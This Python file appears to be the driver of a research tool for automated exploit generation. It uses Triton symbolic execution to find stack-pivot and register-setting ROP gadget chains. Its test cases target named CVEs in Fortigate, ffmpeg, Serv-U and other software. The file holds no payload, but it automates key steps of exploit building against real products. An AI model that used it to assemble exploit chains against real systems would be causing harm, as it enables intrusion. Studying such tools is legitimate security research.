import find_stack_pivot
from triton import TritonContext, ARCH, MemoryAccess, CPUSIZE, Instruction
from solve_pivot_mem import init_mem, init_reg, read_write_check, my_asm, get_reg
import solve_engine
import find_reg_gadget_chain
from loguru import logger
import time
def get_pivot_write_operation(pivot_gadget, address_map, regs):
    ctx = TritonContext()
    ctx.setArchitecture(ARCH.X86_64)
    ctx = init_reg(ctx, regs)
    ctx = init_mem(ctx, address_map)
    address = 0x400000
    jmp_inst = ['loopne','je','jne','ja','jna','jae','jnae','jb','jnb','jbe','jnbe','jg','jng','jge','jnge','jl','jnl','jle','jnle','jz','jnz','js','jns','jc','jnc','jo','jno','jp','jnp','jpe','jpo','jcxz','jecxz']
    writeMemorylist = []
    for i in range(len(pivot_gadget)):
        pivot_gg = pivot_gadget[i].split(' -> ')[1]
        if pivot_gg.split(' ')[0] in jmp_inst:
            return None
        pivot_gg_list = pivot_gg.split(" ; ")
        for j in range(len(pivot_gg_list)):
            instruction = Instruction(address, my_asm(pivot_gg_list[j]))
            ctx.processing(instruction)
            address += len(my_asm(pivot_gg_list[j]))
            if instruction.isMemoryWrite():
                a = instruction.getStoreAccess()
                writeMemory = a[0][0].getAddress()
                writeMemorylist.append(writeMemory)
    return writeMemorylist

def pivot_update_regs(pivot_gadget, address_map, regs, permission_table, stack_mem = {}):
    ctx = TritonContext()
    ctx.setArchitecture(ARCH.X86_64)
    ctx = init_reg(ctx, regs)
    ctx = init_mem(ctx, address_map)
    ctx = init_mem(ctx, stack_mem)
    address = 0x400000
    jmp_inst = ['loopne','je','jne','ja','jna','jae','jnae','jb','jnb','jbe','jnbe','jg','jng','jge','jnge','jl','jnl','jle','jnle','jz','jnz','js','jns','jc','jnc','jo','jno','jp','jnp','jpe','jpo','jcxz','jecxz']
    
    for i in range(len(pivot_gadget)):
        pivot_gg = pivot_gadget[i].split(' -> ')[1]
        if pivot_gg.split(' ')[0] in jmp_inst:
            return None
        pivot_gg_list = pivot_gg.split(" ; ")
        for j in range(len(pivot_gg_list)):
            instruction = Instruction(address, my_asm(pivot_gg_list[j]))
            ctx.processing(instruction)
            # print(pivot_gg_list[j])
            # print(hex(ctx.getConcreteRegisterValue(get_reg(ctx, 'rsp'))))
            address += len(my_asm(pivot_gg_list[j]))
            if not read_write_check(instruction, permission_table):
                 return None
    
    for reg,value in regs.items():
        if reg not in ['fs_base','gs_base']:
            regs[reg] = ctx.getConcreteRegisterValue(get_reg(ctx, reg))
    return regs

def pivot_update_controllable_reg(new_regs, controllable_mem_data):
    new_controllable_regs = []
    for name, value in new_regs.items(): 
        for i in range(len(controllable_mem_data)):
            start_addr = int(controllable_mem_data[i]['start_addr'],16)
            length = controllable_mem_data[i]['length']
            if value >= start_addr and value < start_addr + length:
                new_controllable_regs.append(name)
    return new_controllable_regs

def remove_pivot_write_mem_from_offset_list(pivot_gadget, address_map, regs, controllable_mem_data, offset_list_old):
    offset_list = offset_list_old.copy()
    writeMemorylist = get_pivot_write_operation(pivot_gadget, address_map, regs)
    for w0 in range(len(writeMemorylist)): 
        for w1 in range(len(controllable_mem_data)):
            start_addr = int(controllable_mem_data[w1]['start_addr'],16)
            length = controllable_mem_data[w1]['length']
            if writeMemorylist[w0] >= start_addr and writeMemorylist[w0] < start_addr + length:
                cannot_be_changed_idx = (writeMemorylist[w0]-gadgets_info.controble_addr_base)//8
                if cannot_be_changed_idx in offset_list:
                    offset_list.pop(offset_list.index(cannot_be_changed_idx))
    return offset_list
def complete_test(case_info):
    res_json = {}
    binary = case_info['binary']
    cve_case = case_info['cve']
    max_depth = case_info['depth']
    mem_search_depth = case_info['mem_search_depth']
    reg_search_depth = case_info['reg_search_depth']
    mem_reg_timeout = case_info['mem_reg_timeout']
    reg_timeout = case_info['reg_timeout']
    global gadgets_info
    logger.info(f"Start {cve_case}")
    logger.debug("Load Binary ...")
    start = time.time()
    gadgets_info = find_stack_pivot.info_init_cve(cve_case,binary)
    res_json['Load Time']=time.time() - start
    logger.debug("Load Finish")

    start = time.time()
    pivot_res = find_stack_pivot.main(cve_case,gadgets_info,max_depth=max_depth,res_json=res_json,num_threads=64)
    res_json['Pivot Gadget Chain Found Time']= time.time() - start
    res_json['Pivot Gadget Chain Found Number']=len(pivot_res)

    logger.success(f"Pivot Gadget Chain Found : {len(pivot_res)}")


    for i in range(len(pivot_res)):
        logger.info(f"Gadget {i} : {pivot_res[i]['gadget_chain']}")
    
    choice = 0
    logger.info(f"Choose Gadget {choice}")
    logger.info(pivot_res[choice]['gadget_chain'])
    
    pivot_gadget = pivot_res[choice]['gadget_chain']
    mem_layout = [pivot_res[choice]['address_map'],pivot_res[choice]['offset_list']]

    res_json['Pivot Gadget Chain'] = pivot_res[choice]['gadget_chain']
    res_json['Pivot Memory Layout'] = [pivot_res[choice]['address_map'],pivot_res[choice]['offset_list']]

    logger.info(str(mem_layout))

    logger.info("Start To Find Register Gadget Chain")
    logger.info("Change Memory Layout to Adapt Bad Memory")
    controble_addr_base = gadgets_info.controble_addr_base
    address_map = {}
    for idx, value in mem_layout[0].items():
        address_map[controble_addr_base+idx*8] = {'value':int(value,16), 'length':8}
    pivot_gadget = list(pivot_gadget)
    regs = gadgets_info.regs_init
    regs_init = gadgets_info.regs_init.copy()
    permission_table = gadgets_info.permission_table

    offset_list = mem_layout[1]
    controllable_mem_data = gadgets_info.controllable_mem_data

    offset_list = remove_pivot_write_mem_from_offset_list(pivot_gadget, address_map, regs, controllable_mem_data, offset_list)
    stack_mem = gadgets_info.stack_mem
    after_pivot_regs = pivot_update_regs(pivot_gadget, address_map, regs, permission_table, stack_mem)
    
    gadgets_info.regs_init = after_pivot_regs
    
    rsp_idx = (after_pivot_regs['rsp'] - controble_addr_base)//8
    address_map_new = mem_layout[0].copy()
    while(1):
        f = False
        for i_a in range(15): # 至少得能写0x28个字节
            if rsp_idx+i_a not in offset_list:
                print(address_map_new)
                (address_map_new, offset_list, pivot_gadget) = solve_engine.jmp_stack_after_pivot(address_map_new, gadgets_info, offset_list, pivot_gadget)
                address_map = {}
                for idx, value in address_map_new.items():
                    address_map[controble_addr_base+idx*8] = {'value':int(value,16), 'length':8}
                after_pivot_regs = pivot_update_regs(pivot_gadget, address_map, regs_init.copy(), permission_table)
                gadgets_info.regs_init = after_pivot_regs
                rsp_idx = (after_pivot_regs['rsp'] - controble_addr_base)//8
                # address_map_new[rsp_idx] = "0xdeadbeef"
                f = True
                break
        if not f:
            break
    
    logger.info("Adapt Memory Finished")
    logger.info(f"Adapt Memory Pivot Gadget Chain : {pivot_gadget}")
    res_json["Adapt Memory Pivot Gadget Chain"] = pivot_gadget

    logger.info("Initialize Register and Memory Context")
    address_map = {rsp_idx:"0xdeadbeef"}

    gadgets_info.address_map = address_map
    gadgets_info.offset_list = offset_list

    gadgets_info.controllable_regs = ['rsp']
    gadgets_info.stack_pivot_chain = ['0x10000 -> ret']

    logger.info("Start Set Mem And Reg")
    reg_gadget_chain_res = find_reg_gadget_chain.main('CVE',cve_case,gadgets_info,mem_search_depth=mem_search_depth,reg_search_depth=reg_search_depth,res_json=res_json,mem_reg_timeout=mem_reg_timeout, reg_timout=reg_timeout)
    if reg_gadget_chain_res!= False:
        (reg_gadget_chain,reg_gadget_map) = reg_gadget_chain_res
        logger.debug(reg_gadget_chain)
        logger.debug(reg_gadget_map)
    else:
        exit()
    gadgets_info.stack_pivot_chain = [pivot_gadget[0]]
    gadgets_info.regs_init = regs_init
    for i, v in address_map_new.items():
        if v == '0xdeadbeef':
            reg_gadget_map[i] = gadgets_info.ret_gadget['addr']
        else:
            reg_gadget_map[i] = v
    res_json['Finall Gadget Chain Layout'] = reg_gadget_map
    logger.info(f'Finall Gadget Chain Layout : {reg_gadget_map}')
    if solve_engine.check(gadgets_info, reg_gadget_map, stack_mem)[0]:
        logger.success(f"{cve_case} Reg check Success")
        if len(gadgets_info.target_mem_value)>0 and solve_engine.check_mem(gadgets_info, reg_gadget_map, stack_mem)[0]:
            logger.success(f"{cve_case} Mem check Success")
    
            logger.success(f"All Res Json {res_json}")
if __name__ == '__main__':
    case_infos = {
                #   "CTF-TEST":{"binary":"pwn","cve":"ccb-2024-final-NFS-Heap","depth":1,"mem_search_depth":1,"reg_search_depth":3,"mem_reg_timeout":2*60,"reg_timeout":10*60},
                #   "Fortigate-42475":{"binary":"init","cve":"cve-2022-42475","depth":1,"mem_search_depth":1,"reg_search_depth":3,"mem_reg_timeout":2*60,"reg_timeout":10*60},
                #   "ffmpeg-10191":{"binary":"ffmpeg","cve":"cve-2016-10191","depth":1,"mem_search_depth":1,"reg_search_depth":3,"mem_reg_timeout":2*60,"reg_timeout":10*60},
                  "Fortigate-25610":{"binary":"init","cve":"cve-2023-25610","depth":1,"mem_search_depth":1,"reg_search_depth":3,"mem_reg_timeout":2*60,"reg_timeout":10*60},
                #   "Fortigate-21762":{"binary":"init","cve":"cve-2024-21762","depth":1,"mem_search_depth":1,"reg_search_depth":3,"mem_reg_timeout":2*60,"reg_timeout":10*60},
                #   "Synacktiv PR4100":{"binary":"login_mgr.cgi","cve":"Synacktiv_PR4100","depth":1,"mem_search_depth":1,"reg_search_depth":3,"mem_reg_timeout":2*60,"reg_timeout":10*60},
                #   "Serv-U":{"binary":"Serv-U.dll","cve":"cve-2021-35211","depth":1,"mem_search_depth":1,"reg_search_depth":3,"mem_reg_timeout":2*60,"reg_timeout":10*60},
                #   "Fortigate-23113":{"binary":"init","cve":"cve-2024-23113","depth":0,"mem_search_depth":1,"reg_search_depth":3,"mem_reg_timeout":2*60,"reg_timeout":10*60},
                #   "ffmpeg-10190":{"binary":"ffmpeg","cve":"cve-2016-10190","depth":1,"mem_search_depth":1,"reg_search_depth":3,"mem_reg_timeout":2*60,"reg_timeout":10*60},
                #   "Bento4":{"binary":"libc-2.23.so","cve":"cve-2022-3974","depth":1,"mem_search_depth":1,"reg_search_depth":3,"mem_reg_timeout":2*60,"reg_timeout":10*60},
                }

    for c,info in case_infos.items():
        log_handler = logger.add(
            sink=f"test/{info['cve']}_4.log",  # 日志文件路径
            level="INFO",
            encoding="utf-8"
        )
        complete_test(info)
        logger.remove(log_handler)